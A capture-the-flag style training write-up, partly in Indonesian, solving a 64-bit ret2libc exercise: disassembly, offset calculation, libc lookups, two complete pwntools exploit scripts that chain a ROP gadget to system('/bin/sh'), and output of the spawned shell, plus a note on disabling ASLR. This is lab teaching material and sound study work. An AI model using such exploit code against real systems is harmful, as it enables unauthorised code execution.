---
slug: "pwn-hsr-64"
title: "hsr_64"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2libc."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X64","RET2LIBC"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-hsr-64"
---

# hsr_64

> Latihan buat persiapan seleksi LKS, isinya ret2libc.

Diawal, kita sudah diberi notes.txt. berikut isinya:

```
Welcome to ret2lib dmn kamu belajar tentang penggunaan lib disini. Disini aslr mati btw
challsnya gk beda jauh juga sama ret2plt. Jadi enjoyyy

Untuk matiin aslr:

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

0 -> mati aslrnya
2 -> nyala

Beberapa command tambahan:

printf "0x%x\n" $((memory_addr_1 + memorya_addr_2))
result: totalnya

ldd nama_binary -> untuk melihat libc yg dipakai
readelf -s /dirto/libc.so.6 | grep system -> untuk mengambil addr system, jika mager:
p system dalam pwndbg

strings -a -t x /dirto/libc.so.6 | grep /bin/sh -> untuk mengetahui shellnya dmn

Warning:

Dilarang menggunakan automatic dari pwntools (buat dasar ajaa), list larangan:

elf = context.binary = ELF('./nama_binary')
system = elf.sym['system']
sh = next(elf.search('/bin/sh')
```

Jadi, dia ini adalah ret2libc dan ada sebuah rules untung ngerjain Hands-on yang satu ini.

Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ checksec hsr_64                                                                󰥔 13:53:48
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr/hsr_64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Let’s check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main* 41m 26s
❯ pwndbg hsr_64                                                                  󰥔 13:54:12
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from hsr_64...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in hsr_64)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  puts@plt
0x00000000004010b0  printf@plt
0x00000000004010c0  strcspn@plt
0x00000000004010d0  fgets@plt
0x00000000004010e0  strcmp@plt
0x00000000004010f0  gets@plt
0x0000000000401100  setvbuf@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  init
0x000000000040123d  mabar_session
0x0000000000401302  main
0x0000000000401330  __libc_csu_init
0x00000000004013a0  __libc_csu_fini
0x00000000004013a8  _fini
```

There’s so many symbols and function in this one, but i'll just check the main and mabar\_session.

```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401302 <+0>:     endbr64
   0x0000000000401306 <+4>:     push   rbp
   0x0000000000401307 <+5>:     mov    rbp,rsp
   0x000000000040130a <+8>:     mov    eax,0x0
   0x000000000040130f <+13>:    call   0x4011f6 <init>
   0x0000000000401314 <+18>:    mov    eax,0x0
   0x0000000000401319 <+23>:    call   0x40123d <mabar_session>
   0x000000000040131e <+28>:    mov    eax,0x0
   0x0000000000401323 <+33>:    pop    rbp
   0x0000000000401324 <+34>:    ret
End of assembler dump.
gef➤  disas mabar_session
Dump of assembler code for function mabar_session:
   0x000000000040123d <+0>:     endbr64
   0x0000000000401241 <+4>:     push   rbp
   0x0000000000401242 <+5>:     mov    rbp,rsp
   0x0000000000401245 <+8>:     sub    rsp,0x50
   0x0000000000401249 <+12>:    lea    rdi,[rip+0xdb8]        # 0x402008
   0x0000000000401250 <+19>:    call   0x4010a0 <puts@plt>
   0x0000000000401255 <+24>:    lea    rdi,[rip+0xdcd]        # 0x402029
   0x000000000040125c <+31>:    call   0x4010a0 <puts@plt>
   0x0000000000401261 <+36>:    lea    rdi,[rip+0xde0]        # 0x402048
   0x0000000000401268 <+43>:    call   0x4010a0 <puts@plt>
   0x000000000040126d <+48>:    lea    rdi,[rip+0xe1c]        # 0x402090
   0x0000000000401274 <+55>:    call   0x4010a0 <puts@plt>
   0x0000000000401279 <+60>:    lea    rdi,[rip+0xe50]        # 0x4020d0
   0x0000000000401280 <+67>:    mov    eax,0x0
   0x0000000000401285 <+72>:    call   0x4010b0 <printf@plt>
   0x000000000040128a <+77>:    mov    rdx,QWORD PTR [rip+0x2ddf]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401291 <+84>:    lea    rax,[rbp-0x10]
   0x0000000000401295 <+88>:    mov    esi,0xf
   0x000000000040129a <+93>:    mov    rdi,rax
   0x000000000040129d <+96>:    call   0x4010d0 <fgets@plt>
   0x00000000004012a2 <+101>:   lea    rax,[rbp-0x10]
   0x00000000004012a6 <+105>:   lea    rsi,[rip+0xe67]        # 0x402114
   0x00000000004012ad <+112>:   mov    rdi,rax
   0x00000000004012b0 <+115>:   call   0x4010c0 <strcspn@plt>
   0x00000000004012b5 <+120>:   mov    BYTE PTR [rbp+rax*1-0x10],0x0
   0x00000000004012ba <+125>:   lea    rax,[rbp-0x10]
   0x00000000004012be <+129>:   lea    rsi,[rip+0xe51]        # 0x402116
   0x00000000004012c5 <+136>:   mov    rdi,rax
   0x00000000004012c8 <+139>:   call   0x4010e0 <strcmp@plt>
   0x00000000004012cd <+144>:   test   eax,eax
   0x00000000004012cf <+146>:   jne    0x4012ff <mabar_session+194>
   0x00000000004012d1 <+148>:   lea    rdi,[rip+0xe48]        # 0x402120
   0x00000000004012d8 <+155>:   mov    eax,0x0
   0x00000000004012dd <+160>:   call   0x4010b0 <printf@plt>
   0x00000000004012e2 <+165>:   lea    rax,[rbp-0x50]
   0x00000000004012e6 <+169>:   mov    rdi,rax
   0x00000000004012e9 <+172>:   mov    eax,0x0
   0x00000000004012ee <+177>:   call   0x4010f0 <gets@plt>
   0x00000000004012f3 <+182>:   lea    rdi,[rip+0xe4e]        # 0x402148
   0x00000000004012fa <+189>:   call   0x4010a0 <puts@plt>
   0x00000000004012ff <+194>:   nop
   0x0000000000401300 <+195>:   leave
   0x0000000000401301 <+196>:   ret
End of assembler dump.
```

Okay, there’s gets. But as we can see, we have to pass the first fgets first.

![](/assets/uploads/14555b32-282b-43b2-8377-5d361cb5c808-image-5.png)

As we can see, we have to input “Yui” first so we can execute the gets.

Okay then, now we count the padding for the gets. 0x50 = 80, because its x86, we need 88 for reaching RIP. And now we verification for the offset for the RIP.

```
>>> 0x50
80
>>> 0x50 + 8
88
```

And now, sekarang kita mencari apa yang diperlukan untuk ret2libc.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main* 18s
❯ ldd hsr_64                                                                     󰥔 13:56:08
        linux-vdso.so.1 (0x00007ffff7fb7000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7c00000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fb9000)

~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ readelf -s /usr/lib/libc.so.6 | grep system                                    󰥔 13:56:17
  1066: 000000000005e6f0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ strings -a -t x /usr/lib/libc.so.6 | grep /bin/sh                              󰥔 13:56:24
 1e9180 /bin/sh
 1ebaff /bin/sh
```

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("hsr_64_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = "amd64"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    padding = 88
    libc = 0x00007ffff7c00000
    libcsystem = libc + 0x000000000005e6f0
    binsh = libc + 0x1e9180
    
    payload = flat(
        b'A' * padding,
        0x0000000000401393, #RDI
        binsh,
        libcsystem,
        0
    )
    togets = "Yui"
    # good luck pwning :)
    r.sendline(togets)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Solver resmi dari latihan LKS nya adalah:

```python
# Sama yakk, gk boleh automatic dulu buat kalian belajar. Nanti pas lomba automate wkwk

from pwn import *

p = process('./hsr_64')

libc_addr = 0x7ffff7da5000
system = libc_addr + 0x54bd0
shell = libc_addr + 0x1acea4

# Masukin rop gadget

rdi = 0x401393
ret = 0x40101a

offset = 88

payload = flat(
    'A' * offset,
    p64(rdi),
    p64(shell),
    p64(ret),
    p64(system),
    #p64(0x0)
)

p.sendlineafter(b'> ', b'Yui')
p.sendlineafter(b'> ', payload)
p.interactive()
```

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ python3 solve.py LOCAL                                                         󰥔 13:57:07
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr/hsr_64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[┤] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/hsr/hsr_64_patched': pid 97148
/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr/solve.py:47: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline(togets)
[*] Switching to interactive mode
*Yui sedang mencoba bermain hsr
Lylera: Wih, main apa nihhh
Yui: Nyoba hsr. Katanya sih gem asyik. Tp... gk bisa lompat..., huh?
Lylera: *nahan ketawa, ya iyalah. Eh anyway follow dong namaku
Yui: Bentar, ku suruh masukin nama sama deskripsi profile dulu

>
 Yui: Done lalu buat deskripsinya

>
 Yui: Oke donee. Nih ya Ly kalau mau add
$ ls
hsr_32          hsr_64          hsr.c    notes.txt   solve.py
hsr_32_patched  hsr_64_patched  hsr.zip  solve32.py
```
